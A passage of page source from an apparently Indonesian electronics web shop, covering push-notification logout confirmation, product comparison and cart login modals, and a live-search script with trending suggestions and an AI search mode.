            toast.style.animation = 'slideOutDown 0.3s ease';
            setTimeout(() => toast.remove(), 300);
        }, 3000);
    },
    
    /**
     * Convert VAPID key to Uint8Array
     */
    urlBase64ToUint8Array(base64String) {
        const padding = '='.repeat((4 - base64String.length % 4) % 4);
        const base64 = (base64String + padding)
            .replace(/\-/g, '+')
            .replace(/_/g, '/');
        
        const rawData = window.atob(base64);
        const outputArray = new Uint8Array(rawData.length);
        
        for (let i = 0; i < rawData.length; ++i) {
            outputArray[i] = rawData.charCodeAt(i);
        }
        return outputArray;
    },
    
    /**
     * Check if push notification is currently active
     * @returns {Promise<boolean>}
     */
    async isPushActive() {
        try {
            // Check browser subscription
            if (!('serviceWorker' in navigator)) return false;
            
            const registration = await navigator.serviceWorker.getRegistration();
            if (!registration) return false;
            
            const subscription = await registration.pushManager.getSubscription();
            if (!subscription) return false;
            
            // Also check server status
            const serverStatus = await this.checkSubscriptionStatus();
            
            return serverStatus;
        } catch (error) {
            return false;
        }
    },
    
    /**
     * Show logout confirmation if push notification is active
     * Call this before logout action
     * @returns {Promise<boolean>} true if user confirms logout, false if cancelled
     */
    async confirmLogoutWithPushNotification() {
        const isActive = await this.isPushActive();
        
        if (!isActive) {
            // No active push, proceed with logout
            return true;
        }
        
        // Show modal confirmation using modal.css
        return new Promise((resolve) => {
            // Create modal HTML
            const modalHTML = `
                <div class="modal-overlay" id="logoutConfirmModal">
                    <div class="modal-dialog">
                        <div class="modal-header">
                            <h3 class="modal-title">
                                <span class="modal-icon warning">âš ï¸</span>
                                Konfirmasi Logout
                            </h3>
                        </div>
                        <div class="modal-body">
                            <p class="modal-message">
                                Anda memiliki <strong>notifikasi push yang aktif</strong>.<br><br>
                                Setelah logout, Anda tidak akan menerima notifikasi chat lagi di perangkat ini.<br><br>
                                Apakah Anda yakin ingin melanjutkan logout?
                            </p>
                        </div>
                        <div class="modal-actions" style="padding: 0 20px 20px;">
                            <button class="modal-btn modal-btn-secondary" id="logoutCancelBtn">
                                Batal
                            </button>
                            <button class="modal-btn modal-btn-danger" id="logoutConfirmBtn">
                                Lanjutkan Logout
                            </button>
                        </div>
                    </div>
                </div>
            `;
            
            // Append to body
            const modalContainer = document.createElement('div');
            modalContainer.innerHTML = modalHTML;
            document.body.appendChild(modalContainer.firstElementChild);
            
            const modal = document.getElementById('logoutConfirmModal');
            const confirmBtn = document.getElementById('logoutConfirmBtn');
            const cancelBtn = document.getElementById('logoutCancelBtn');
            
            // Show modal with animation
            requestAnimationFrame(() => {
                modal.classList.add('show');
            });
            
            // Handle confirm
            const handleConfirm = () => {
                cleanup();
                resolve(true);
            };
            
            // Handle cancel
            const handleCancel = () => {
                cleanup();
                resolve(false);
            };
            
            // Cleanup function
            const cleanup = () => {
                modal.classList.remove('show');
                setTimeout(() => {
                    modal.remove();
                }, 200);
                confirmBtn.removeEventListener('click', handleConfirm);
                cancelBtn.removeEventListener('click', handleCancel);
                modal.removeEventListener('click', handleBackdropClick);
            };
            
            // Handle backdrop click
            const handleBackdropClick = (e) => {
                if (e.target === modal) {
                    handleCancel();
                }
            };
            
            // Add event listeners
            confirmBtn.addEventListener('click', handleConfirm);
            cancelBtn.addEventListener('click', handleCancel);
            modal.addEventListener('click', handleBackdropClick);
        });
    }
};

// Add CSS animations
const chatNotifStyle = document.createElement('style');
chatNotifStyle.textContent = `
    @keyframes slideInUp {
        from {
            transform: translateY(100%);
            opacity: 0;
        }
        to {
            transform: translateY(0);
            opacity: 1;
        }
    }
    
    @keyframes slideOutDown {
        from {
            transform: translateY(0);
            opacity: 1;
        }
        to {
            transform: translateY(100%);
            opacity: 0;
        }
    }
`;
document.head.appendChild(chatNotifStyle);

// Auto-initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => ChatNotification.init());
} else {
    ChatNotification.init();
}

// Expose to window for access from other scripts
window.ChatNotification = ChatNotification;

</script>  
    <!-- Footer Collapse Toggle Script -->
  <script nonce="se3iyzEHMc9FQEB4wSyd0w==">
  document.addEventListener('DOMContentLoaded', function() {
    const ftTop = document.getElementById('ftTop');
    const expandBtn = document.getElementById('ftExpandBtn');
    
    if (ftTop && expandBtn) {
      const expandText = expandBtn.querySelector('.expand-text');
      
      expandBtn.addEventListener('click', function() {
        ftTop.classList.toggle('expanded');
        const isExpanded = ftTop.classList.contains('expanded');
        if (expandText) {
          expandText.textContent = isExpanded ? 'Sembunyikan' : 'Selengkapnya';
        }
      });
    }
  });
  </script>
  </footer>

<!-- Compare Sidebar Overlay -->
<div class="compare-overlay" id="compareOverlay"></div>

<!-- Floating Compare Badge (Sticky) -->
<button class="compare-floating-badge" id="compareFloatingBadge" aria-label="Lihat produk yang dibandingkan" style="display:none;">
  <svg class="cfb-icon" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
    <path d="M9.01 14H2v2h7.01v3L13 15l-3.99-4v3zm5.98-1v-3H22V8h-7.01V5L11 9l3.99 4z"/>
  </svg>
  <span class="cfb-text">Bandingkan</span>
  <span class="cfb-count" id="cfbCount">0</span>
</button>

<!-- AI Comparison Modal -->
<div class="ai-compare-modal" id="aiCompareModal">
  <div class="modal-backdrop"></div>
  <div class="modal-container">
    <div class="modal-header">
      <h3 class="modal-title">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
          <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M11,16.5L18,9.5L16.59,8.09L11,13.67L7.91,10.59L6.5,12L11,16.5Z"/>
        </svg>
        Analisis AI: Perbandingan Produk
      </h3>
      <button class="modal-close" id="aiCompareModalClose" aria-label="Tutup">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
          <path d="M18.3 5.7a1 1 0 0 0-1.4 0L12 10.6 7.1 5.7a1 1 0 1 0-1.4 1.4L10.6 12l-4.9 4.9a1 1 0 0 0 1.4 1.4L12 13.4l4.9 4.9a1 1 0 0 0 1.4-1.4L13.4 12l4.9-4.9a1 1 0 0 0 0-1.4z"/>
        </svg>
      </button>
    </div>
    
    <div class="modal-content">
      <!-- Loading State -->
      <div class="ai-loading" id="aiLoading">
        <div class="loading-animation">
          <div class="typing-indicator">
            <span></span>
            <span></span>
            <span></span>
          </div>
          <p>AI sedang menganalisis produk...</p>
          <small>Proses ini membutuhkan waktu 10-30 detik</small>
        </div>
      </div>
      
      <!-- Error State -->
      <div class="ai-error" id="aiError" hidden>
        <div class="error-icon">
          <svg width="48" height="48" viewBox="0 0 24 24" fill="#8adeff">
            <path d="M12,2C17.53,2 22,6.47 22,12C22,17.53 17.53,22 12,22C6.47,22 2,17.53 2,12C2,6.47 6.47,2 12,2M15.59,7L12,10.59L8.41,7L7,8.41L10.59,12L7,15.59L8.41,17L12,13.41L15.59,17L17,15.59L13.41,12L17,8.41L15.59,7Z"/>
          </svg>
        </div>
        <h4>Analisis AI Gagal</h4>
        <p id="aiErrorMessage">Terjadi kesalahan saat memproses analisis.</p>
        <button class="btn btn-outline-primary" id="aiRetry">Coba Lagi</button>
      </div>
      
      <!-- Analysis Results -->
      <div class="ai-results" id="aiResults" hidden>
        <!-- Summary Section -->
        <div class="ai-summary-card">
          <h4>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M11,16.5L6.5,12L7.91,10.59L11,13.67L16.59,8.09L18,9.5L11,16.5Z"/>
            </svg>
            Ringkasan Analisis
          </h4>
          <p id="aiSummary" class="summary-text"></p>
          <div class="winner-badge" id="winnerBadge">
            <strong>Rekomendasi Terbaik:</strong> <span id="winnerProduct"></span>
            <small id="winnerReason"></small>
          </div>
        </div>
        
        <!-- Comparison Table -->
        <div class="ai-comparison-table">
          <h4>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <path d="M3,3H21V5H3V3M3,7H21V9H3V7M3,11H21V13H3V11M3,15H21V17H3V15M3,19H21V21H3V19Z"/>
            </svg>
            Perbandingan Detail
          </h4>
          <div id="comparisonTable" class="comparison-grid"></div>
        </div>
        
        <!-- Detailed Analysis -->
        <div class="ai-detailed-analysis">
          <h4>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <path d="M14,2A8,8 0 0,1 22,10A8,8 0 0,1 14,18A8,8 0 0,1 6,10A8,8 0 0,1 14,2M14,4A6,6 0 0,0 8,10A6,6 0 0,0 14,16A6,6 0 0,0 20,10A6,6 0 0,0 14,4M14,6A4,4 0 0,1 18,10A4,4 0 0,1 14,14A4,4 0 0,1 10,10A4,4 0 0,1 14,6M14,8A2,2 0 0,0 12,10A2,2 0 0,0 14,12A2,2 0 0,0 16,10A2,2 0 0,0 14,8Z"/>
            </svg>
            Analisis Mendalam
          </h4>
          <div id="detailedAnalysis" class="products-analysis"></div>
        </div>
        
        <!-- Recommendations -->
        <div class="ai-recommendations">
          <h4>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <path d="M12,17.27L18.18,21L16.54,13.97L22,9.24L14.81,8.62L12,2L9.19,8.62L2,9.24L7.45,13.97L5.82,21L12,17.27Z"/>
            </svg>
            Rekomendasi Berdasarkan Kebutuhan
          </h4>
          <div class="recommendations-grid">
            <div class="recommendation-card">
              <h5>ðŸ’° Budget Conscious</h5>
              <p id="budgetRecommendation"></p>
            </div>
            <div class="recommendation-card">
              <h5>âš¡ Performance Focused</h5>
              <p id="performanceRecommendation"></p>
            </div>
            <div class="recommendation-card">
              <h5>âš–ï¸ Balanced Choice</h5>
              <p id="balancedRecommendation"></p>
            </div>
          </div>
        </div>
        
        <!-- Buying Tips -->
        <div class="ai-tips">
          <h4>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
              <path d="M11,18H13V16H11V18M12,6A4,4 0 0,0 8,10H10A2,2 0 0,1 12,8A2,2 0 0,1 14,10C14,12 11,11.75 11,15H13C13,12.75 16,12.5 16,10A4,4 0 0,0 12,6M5,3H19A2,2 0 0,1 21,5V19A2,2 0 0,1 19,21H5A2,2 0 0,1 3,19V5A2,2 0 0,1 5,3Z"/>
            </svg>
            Tips Pembelian
          </h4>
          <ul id="buyingTips" class="tips-list"></ul>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Cart Login Modal -->
<div class="modal-overlay" id="cartLoginModal">
  <div class="modal-dialog">
    <div class="modal-header">
      <h3 class="modal-title">
        <div class="modal-icon info">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
            <path d="M17,18A2,2 0 0,1 19,20A2,2 0 0,1 17,22C15.89,22 15,21.1 15,20C15,18.89 15.89,18 17,18M1,2H4.27L5.21,4H20A1,1 0 0,1 21,5C21,5.17 20.95,5.34 20.88,5.5L17.3,11.97C16.96,12.58 16.3,13 15.55,13H8.1L7.2,14.63L7.17,14.75A0.25,0.25 0 0,0 7.42,15H19V17H7C5.89,17 5,16.1 5,15C5,14.65 5.09,14.32 5.24,14.04L6.6,11.59L3,4H1V2M7,18A2,2 0 0,1 9,20A2,2 0 0,1 7,22C5.89,22 5,21.1 5,20C5,18.89 5.89,18 7,18M16,11L18.78,6H6.14L8.5,11H16Z"/>
          </svg>
        </div>
        Login untuk Melanjutkan
      </h3>
    </div>
    <div class="modal-body">
      <p class="modal-message" style="margin-bottom: 16px;">Silakan login atau daftar untuk mengakses keranjang belanja dan menyelesaikan pesanan Anda.</p>
      <div style="background: #f8fafc; border-radius: 8px; padding: 12px; margin-bottom: 20px;">
        <p style="font-size: 14px; color: #646947; margin: 0; line-height: 1.6;">
          <strong style="color: #2a2a0f;">Keuntungan dengan akun:</strong><br>
          âœ“ Simpan keranjang belanja Anda<br>
          âœ“ Lacak status pesanan secara real-time<br>
          âœ“ Checkout lebih cepat dengan data tersimpan<br>
          âœ“ Dapatkan notifikasi promo & diskon eksklusif
        </p>
      </div>
      <div class="modal-actions">
        <button class="modal-btn modal-btn-secondary" id="cartLoginCancel">Batal</button>
        <button class="modal-btn modal-btn-primary" id="cartLoginConfirm" style="background: #8adeff; border-color: #8adeff;">Login</button>
        <button class="modal-btn modal-btn-primary" id="cartRegisterBtn" style="background: #8adeff; border-color: #8adeff;">Daftar</button>
      </div>
    </div>
  </div>
</div>


<script data-inlined="app.js">
(function initLiveSearch(){
  function setup() {
    const searchInput = document.getElementById('searchInput');
    const suggest = document.getElementById('searchSuggest');
    const searchBtn = document.getElementById('searchBtn');
    const aiToggleBtn = document.getElementById('aiToggleBtn');
    
    if (!searchInput || !suggest || !aiToggleBtn) {
      console.log('[LiveSearch] Elemen belum ada, retry...');
      return false;
    }

    let debounceTimer = null;
    let lastQuery = '';
    let currentIndex = -1;
    let currentAbortController = null;
    let isAIModeEnabled = false; // AI mode OFF by default
    let isAIProcessing = false; // Flag to prevent closing suggest box during AI processing
    
    // Trending cache
    let trendingCache = null;
    let trendingLoading = false;
    
    // Trending products cache
    let trendingProductsCache = null;
    let trendingProductsLoading = false;
    
    const MIN_LEN = 2;
    const DEBOUNCE = 300;
    const AI_TIMEOUT = 15000; // 15 seconds timeout for AI endpoint

    // Load AI mode preference from localStorage
    const savedAIMode = localStorage.getItem('plazait_ai_search_mode');
    if (savedAIMode === 'enabled') {
      isAIModeEnabled = false;
      aiToggleBtn.classList.remove('active');
    }
    
    // Update placeholder based on AI mode
    function updatePlaceholder() {
      if (isAIModeEnabled) {
        searchInput.placeholder = 'ðŸ¤– Coba: "laptop HP core i3 untuk kerja" atau "tinta epson l3210"';
      } else {
        // Static placeholder for typing animation
        searchInput.placeholder = '';
      }
    }
    
    // Typing animation for placeholder
    let typingTimeout = null;
    let currentProductIndex = 0;
    let currentCharIndex = 0;
    let isTyping = false;
    let isDeleting = false;
    
    const popularProducts = [
      'Oppo A6',
      'Asus Ryzen 3',
      'Starlink V4',
      'HP Victus',
      'Lenovo RTX 5060',
      'ROG Strix',
      'iPhone 13',
      'Xpad 20',
      'Xiaomi 14',
      'Epson L3210',
      'Realme C85',
      'Brother T720',
      'Mouse Logitech'
    ];
    
    function typeWriter() {
      if (isAIModeEnabled || document.activeElement === searchInput) {
        return; // Skip typing if AI mode is on or input is focused
      }
      
      const currentProduct = popularProducts[currentProductIndex];
      
      if (!isDeleting) {
        // Typing forward
        if (currentCharIndex < currentProduct.length) {
          searchInput.placeholder = currentProduct.substring(0, currentCharIndex + 1);
          currentCharIndex++;
          typingTimeout = setTimeout(typeWriter, 100); // Typing speed
        } else {
          // Finished typing, wait before deleting
          typingTimeout = setTimeout(() => {
            isDeleting = true;
            typeWriter();
          }, 2000); // Pause before deleting
        }
      } else {
        // Deleting backward
        if (currentCharIndex > 0) {
          searchInput.placeholder = currentProduct.substring(0, currentCharIndex - 1);
          currentCharIndex--;
          typingTimeout = setTimeout(typeWriter, 50); // Deleting speed (faster)
        } else {
          // Finished deleting, move to next product
          isDeleting = false;
          currentProductIndex = (currentProductIndex + 1) % popularProducts.length;
          typingTimeout = setTimeout(typeWriter, 500); // Pause before typing next
        }
      }
    }
    
    function startTypingAnimation() {
      if (!isAIModeEnabled && !typingTimeout) {
        currentCharIndex = 0;
        isDeleting = false;
        typeWriter();
      }
    }
    
    function stopTypingAnimation() {
      if (typingTimeout) {
        clearTimeout(typingTimeout);
        typingTimeout = null;
      }
    }
    
    // Set initial placeholder
    updatePlaceholder();
    
    // Start typing animation for normal mode
    if (!isAIModeEnabled) {
      startTypingAnimation();
    }

    function esc(str){
      if (str === null || str === undefined) return '';
      return String(str)
        .replace(/&/g,'&amp;')
        .replace(/</g,'&lt;')
        .replace(/>/g,'&gt;')
        .replace(/"/g,'&quot;')
        .replace(/'/g,'&#39;');
    }

    function clearSuggest(){
      suggest.innerHTML = '';
      suggest.hidden = true;
      suggest.classList.remove('open', 'trending-mode');
      currentIndex = -1;
    }

    // ==================== TRENDING FUNCTIONS ====================
    
    async function fetchTrending() {
      if (trendingCache) return trendingCache;
      if (trendingLoading) return null;
      
      trendingLoading = true;
      
      try {
        const res = await fetch('/api/trending_searches.php?timeframe=7d&limit=8');
        const data = await res.json();
        
        if (data.ok && Array.isArray(data.data)) {
          trendingCache = data.data;
          console.log('[Trending] Loaded', trendingCache.length, 'items');
          return trendingCache;
        }
      } catch (err) {
        console.error('[Trending] Fetch error:', err);
      } finally {
        trendingLoading = false;
      }
      
      return null;
    }
    
    async function fetchTrendingProducts() {
      if (trendingProductsCache) return trendingProductsCache;
      if (trendingProductsLoading) return null;
      
      trendingProductsLoading = true;
      
      try {
        const res = await fetch('/api/trending_products.php?timeframe=7d&limit=6');
        const data = await res.json();
        
        if (data.ok && Array.isArray(data.data)) {
          trendingProductsCache = data.data;
          console.log('[Trending Products] Loaded', trendingProductsCache.length, 'items');
          return trendingProductsCache;
        }
      } catch (err) {
        console.error('[Trending Products] Fetch error:', err);
      } finally {
        trendingProductsLoading = false;
      }
      
      return null;
    }
    
    function renderTrendingSuggestions(trends, products) {
      if ((!trends || trends.length === 0) && (!products || products.length === 0)) {
        clearSuggest();
        return;
      }
      
      let html = `<div class="trending-container">`;
      
      // Left column: Trending searches
      if (trends && trends.length > 0) {
        html += `
          <div class="trending-column trending-searches">
            <div class="trending-header">
              <span class="trending-icon">ðŸ”¥</span>
              <span class="trending-title">Pencarian Trending</span>
            </div>
        `;
        
        html += trends.map((t, idx) => {
          const categoryHint = t.category_hint ? `<span class="trending-category">${esc(t.category_hint)}</span>` : '';
          return `
            <div class="trending-item" data-query="${esc(t.query)}" data-index="${idx}">
              <span class="trending-rank">
                <img src="/assets/img/uptrend.image" alt="trending" width="16" height="16" style="vertical-align: middle;">
              </span>
              <span class="trending-query">${esc(t.query)}</span>
              ${categoryHint}
            </div>
          `;
        }).join('');
        
        html += `</div>`;
      }
      
      // Right column: Trending products
      if (products && products.length > 0) {
        html += `
          <div class="trending-column trending-products">
            <div class="trending-header">
              <span class="trending-icon">â­</span>
              <span class="trending-title">Produk Populer</span>
            </div>
        `;
        
        html += products.map((p, idx) => {
          return `
            <div class="trending-product-item" data-product-id="${esc(p.id)}" data-slug="${esc(p.slug)}" data-query="${esc(p.top_query || '')}" data-index="${idx}">
              <img src="${esc(p.image)}" alt="${esc(p.name)}" class="trending-product-thumb">
              <div class="trending-product-info">
                <div class="trending-product-name">${esc(p.name)}</div>
                <div class="trending-product-price">${esc(p.price_label)}</div>
              </div>
            </div>
          `;
        }).join('');
        
        html += `</div>`;
      }
      
      html += `</div>`;
      
      suggest.innerHTML = html;
      suggest.hidden = false;
      suggest.classList.add('open', 'trending-mode');
      suggest.style.display = 'block';
      
      console.log('[Trending] Rendered', trends?.length || 0, 'searches and', products?.length || 0, 'products');
    }
    
    function trackSearchClick(query, productId) {
      fetch('/api/track_search_click.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: query,
          product_id: productId,
          click_type: 'suggestion'
        })
      }).catch(() => {}); // silent fail
    }
    
    function trackTrendingClick(query) {
      fetch('/api/track_search_click.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: query,
          click_type: 'trending'
        })
      }).catch(() => {});
    }
    
    function trackTrendingProductClick(productId, query) {
      fetch('/api/track_search_click.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: query || 'trending_product',
          product_id: productId,
          click_type: 'trending_product'
        })
      }).catch(() => {});
    }
    
    function trackSearchSubmit(query) {
      fetch('/api/track_search_click.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query: query,
          click_type: 'submit'
        })
      }).catch(() => {});
    }
    
    function logFinalSearch(query) {
      // Log the final search to analytics (not during typing)
      fetch('/api/search_products.php?q=' + encodeURIComponent(query) + '&log=1', {
        headers: { 'Accept': 'application/json' }
      }).catch(() => {});
    }

    // ==================== END TRENDING FUNCTIONS ====================

    function clearSuggest(){
      suggest.innerHTML = '';
      suggest.hidden = true;
      suggest.classList.remove('open', 'trending-mode');
      currentIndex = -1;
    }

    // AI Toggle Handler
    aiToggleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      
      isAIModeEnabled = !isAIModeEnabled;
      
      if (isAIModeEnabled) {
        aiToggleBtn.classList.add('active');
        localStorage.setItem('plazait_ai_search_mode', 'enabled');
        updatePlaceholder(); // Update placeholder text
        stopTypingAnimation(); // Stop typing animation in AI mode
        
        // Show AI prompt if there's a query
        const query = searchInput.value.trim();
        if (query.length >= MIN_LEN) {
          showAISearchPrompt(query);
        } else {
          showAIActivationMessage();
        }
      } else {
        aiToggleBtn.classList.remove('active');
        localStorage.setItem('plazait_ai_search_mode', 'disabled');
        updatePlaceholder(); // Update placeholder text
        startTypingAnimation(); // Start typing animation in normal mode
        clearSuggest();
        
        // Switch to normal search if there's a query
        const query = searchInput.value.trim();
        if (query.length >= MIN_LEN) {
          performSearch(query);
        }
      }
    });

    function showAIActivationMessage() {
      suggest.innerHTML = `
        <div class="ai-progress-container">
          <div class="ai-progress-header">
            <div class="ai-progress-icon">âœ¨</div>
            <div class="ai-progress-text">
              <div class="ai-progress-title">AI Search Mode Activated!</div>
              <div class="ai-progress-subtitle">Ketik query Anda untuk pencarian cerdas</div>
            </div>
          </div>
        </div>
      `;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
    }

    function renderAIInsights(insights){
      if (!insights) return '';
      
      // Generate AI summary via backend endpoint
      const summary = insights.ai_summary || generateAISummary(insights);
      
      if (!summary) return '';
      
      return `
        <div class="ai-result-banner">
          <div class="ai-result-icon">âœ¨</div>
          <div class="ai-result-text">
            <div class="ai-result-title">AI Assistant</div>
            <div class="ai-result-description">${summary}</div>
          </div>
        </div>
      `;
    }
    
    function generateAISummary(insights) {
      // Fallback client-side summary generation if backend doesn't provide ai_summary
      const productName = insights.product_name || '';
      const categoryPath = insights.category_path || '';
      const priceRange = insights.price_range || {};
      const intent = insights.intent || '';
      
      let summary = '';
      
      // Parse category for natural display
      let categoryDisplay = '';
      if (categoryPath) {
        const categoryParts = categoryPath.split('/');
        categoryDisplay = categoryParts[categoryParts.length - 1] || categoryParts[categoryParts.length - 2] || categoryPath;
      }
      
      // Intent-based opening
      if (intent === 'cek_stok') {
        summary = `Berikut ketersediaan stok untuk <strong>${esc(productName)}</strong>. `;
      } else if (intent === 'rekomendasi_produk') {
        summary = `Berikut rekomendasi produk <strong>${esc(categoryDisplay || productName)}</strong> yang kami pilihkan untuk Anda. `;
      } else {
        // Default: cari_harga or general
        if (productName && categoryDisplay) {
          summary = `Kami menemukan <strong>${esc(productName)}</strong> di kategori ${esc(categoryDisplay)}`;
        } else if (productName) {
          summary = `Kami menemukan produk <strong>${esc(productName)}</strong>`;
        } else if (categoryDisplay) {
          summary = `Kami menemukan produk ${esc(categoryDisplay)}`;
        }
        
        // Add price context
        if (priceRange.min > 0 && priceRange.max > 0) {
          const minPrice = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(priceRange.min);
          const maxPrice = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(priceRange.max);
          summary += ` dengan kisaran harga ${minPrice} - ${maxPrice}`;
        } else if (priceRange.min > 0) {
          const minPrice = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(priceRange.min);
          summary += ` dengan harga mulai ${minPrice}`;
        } else if (priceRange.max > 0) {
          const maxPrice = new Intl.NumberFormat('id-ID', { style: 'currency', currency: 'IDR', minimumFractionDigits: 0 }).format(priceRange.max);
          summary += ` dengan harga maksimal ${maxPrice}`;
        }
        
        summary += ' yang sesuai dengan kebutuhan Anda.';
      }
      
      return summary || esc(insights.explanation || '');
    }

    function showAIProgressSteps() {
      return `
        <div class="ai-progress-container">
          <div class="ai-progress-header">
            <div class="ai-progress-icon">ðŸ¤–</div>
            <div class="ai-progress-text">
              <div class="ai-progress-title">AI sedang menganalisis...</div>
              <div class="ai-progress-subtitle">Memproses query Anda dengan kecerdasan buatan</div>
            </div>
          </div>
          <div class="ai-progress-steps">
            <div class="ai-progress-step active">
              <div class="ai-step-icon">1</div>
              <div class="ai-step-text">Memahami maksud pencarian...</div>
            </div>
            <div class="ai-progress-step pending">
              <div class="ai-step-icon">2</div>
              <div class="ai-step-text">Mengekstrak parameter pencarian...</div>
            </div>
            <div class="ai-progress-step pending">
              <div class="ai-step-icon">3</div>
              <div class="ai-step-text">Mencari produk yang relevan...</div>
            </div>
          </div>
        </div>
      `;
    }

    function updateAIProgressStep(step) {
      const steps = suggest.querySelectorAll('.ai-progress-step');
      
      steps.forEach((stepEl, idx) => {
        const icon = stepEl.querySelector('.ai-step-icon');
        
        if (idx < step) {
          stepEl.classList.remove('active', 'pending');
          stepEl.classList.add('completed');
          icon.textContent = 'âœ“';
        } else if (idx === step) {
          stepEl.classList.remove('pending', 'completed');
          stepEl.classList.add('active');
        }
      });
    }

    function renderSuggest(items, aiInsights){
      if (!items.length){
        clearSuggest();
        return;
      }
      
      let html = '';
      
      // Show AI insights if available
      if (aiInsights && aiInsights.explanation) {
        html += renderAIInsights(aiInsights);
      }
      
      // Section header for products with hint
      html += `
        <div class="suggest-section-header">
          <div class="suggest-header-main">
            <span class="suggest-header-icon">ðŸ“¦</span>
            <span class="suggest-header-text">Produk yang ditemukan (${items.length})</span>
          </div>
          <div class="suggest-header-hint">Tekan <kbd>Enter</kbd> untuk lihat semua hasil</div>
        </div>
      `;
      
      // Render product items
      html += items.map((it, idx)=>{
        // Normalisasi & fallback
        const id    = it.id != null ? it.id : '';
        const name  = esc(it.name);
        const slug  = esc(it.slug != null ? it.slug : it.id);
        const img   = esc(it.image || '/assets/img/no-image.png');
        const price = esc(it.price_label || '');

       const url = '/product/' + encodeURIComponent(slug);

        return `
          <div class="suggest-item" data-index="${idx}" data-url="${url}" data-id="${esc(id)}">
            <img src="${img}" alt="${name}" class="suggest-thumb">
            <div class="suggest-meta">
              <div class="suggest-name">${name}</div>
              <div class="suggest-price">${price}</div>
            </div>
          </div>
        `;
      }).join('');
      
      // Footer hint for more results - only show if 10 items (means there might be more)
      if (items.length >= 10) {
        html += `
          <div class="suggest-footer-hint">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" style="vertical-align: -3px; margin-right: 6px;">
              <path d="M9.29 6.71a.996.996 0 0 0 0 1.41L13.17 12l-3.88 3.88a.996.996 0 1 0 1.41 1.41l4.59-4.59a.996.996 0 0 0 0-1.41L10.7 6.7c-.38-.39-1.02-.39-1.41.01z"/>
            </svg>
            <span>Lihat hasil lengkap dengan menekan <kbd>Enter</kbd> atau <a href="#" class="suggest-footer-link" id="footerSearchLink">klik di sini</a></span>
          </div>
        `;
      }
      
      suggest.innerHTML = html;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
      suggest.style.visibility = 'visible';
      suggest.style.opacity = '1';
    }

    function fetchRemote(q, shouldLog = false){
      // Cancel previous request if any
      if (currentAbortController) {
        currentAbortController.abort();
      }
      currentAbortController = new AbortController();

      // Always use standard search for normal mode
      // Only add log=1 parameter when shouldLog is true (intentional search)
      const logParam = shouldLog ? '&log=1' : '';
      const url = '/api/search_products.php?q=' + encodeURIComponent(q) + logParam;
      const fetchOptions = {
        headers: {'Accept':'application/json'},
        signal: currentAbortController.signal
      };

      return fetch(url, fetchOptions)
        .then(r=>r.json())
        .then(j=>{
          if (j.ok && Array.isArray(j.data)) {
            return j;
          }
          return { ok: false, data: [] };
        })
        .catch(err=>{
          if (err.name === 'AbortError') {
            return { ok: false, data: [] };
          }
          return { ok:false, data:[] };
        });
    }

    function showNoResults(q, aiInsights) {
      suggest.innerHTML = `
        <div style="padding: 32px 24px; text-align: center; color: #64748b;">
          <div style="font-size: 56px; margin-bottom: 16px; opacity: 0.6;">ðŸ”</div>
          <div style="font-size: 16px; font-weight: 600; color: #334155; margin-bottom: 8px;">
            Tidak ada hasil untuk "${esc(q)}"
          </div>
          ${aiInsights && aiInsights.explanation ? `
            <div style="font-size: 13px; margin: 16px auto; padding: 12px 16px; background: #f1f5f9; border-radius: 8px; max-width: 400px; color: #475569;">
              <strong style="color: #667eea;">ðŸ¤– AI memahami:</strong><br>
              ${esc(aiInsights.explanation)}
            </div>
          ` : ''}
          <div style="font-size: 13px; margin-top: 16px; opacity: 0.8;">
            Coba kata kunci lain atau hubungi kami untuk bantuan
          </div>
        </div>
      `;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
    }

    function showErrorMessage() {
      suggest.innerHTML = `
        <div style="padding: 32px 24px; text-align: center; color: #8adeff;">
          <div style="font-size: 48px; margin-bottom: 12px;">âš ï¸</div>
          <div style="font-size: 14px; font-weight: 600; margin-bottom: 8px;">
            Pencarian tidak tersedia
          </div>
          <div style="font-size: 12px; opacity: 0.8;">
            Silakan coba lagi dalam beberapa saat
          </div>
        </div>
      `;
      suggest.hidden = false;
      suggest.classList.add('open');
      suggest.style.display = 'block';
    }

    function showAIErrorState(q) {
      suggest.innerHTML = `
        <div class="ai-progress-container">
          <div class="ai-progress-header">
            <div class="ai-progress-icon" style="background: linear-gradient(135deg, #f59e0b 0%, #8adeff 100%);">âš¡</div>
            <div class="ai-progress-text">
              <div class="ai-progress-title">AI sedang memproses...</div>
              <div class="ai-progress-subtitle">Menganalisis query: "${esc(q)}"</div>
            </div>
          </div>
          <div style="padding: 16px; margin-top: 12px; background: #fef3c7; border-radius: 8px; border-left: 3px solid #f59e0b;">
